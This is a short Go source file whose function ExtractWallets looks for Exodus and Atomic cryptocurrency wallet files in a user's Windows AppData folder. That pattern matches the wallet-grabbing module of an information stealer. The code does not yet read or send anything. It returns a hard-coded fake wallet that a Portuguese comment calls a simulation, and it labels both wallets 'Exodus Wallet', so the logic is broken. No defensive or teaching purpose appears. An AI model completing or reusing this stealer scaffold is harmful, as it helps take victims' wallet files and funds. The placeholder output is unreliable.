package crypto

import (
    "fmt"
    "os"
    "path/filepath"
)

type Wallet struct {
    Name    string `json:"name"`
    Address string `json:"address"`
    Balance string `json:"balance"`
}

func ExtractWallets() ([]Wallet, error) {
    home, _ := os.UserHomeDir()
    walletPaths := []string{
        filepath.Join(home, "AppData", "Roaming", "Exodus", "exodus.wallet"),
        filepath.Join(home, "AppData", "Roaming", "Atomic", "atomic.wallet"),
    }

    var wallets []Wallet

    for _, path := range walletPaths {
        if _, err := os.Stat(path); os.IsNotExist(err) {
            continue
        }

        // Simulação de extração de carteiras
        wallet := Wallet{
            Name:    "Exodus Wallet",
            Address: "0x1234567890abcdef",
            Balance: "1.5 ETH",
        }
        wallets = append(wallets, wallet)
    }

    return wallets, nil
}
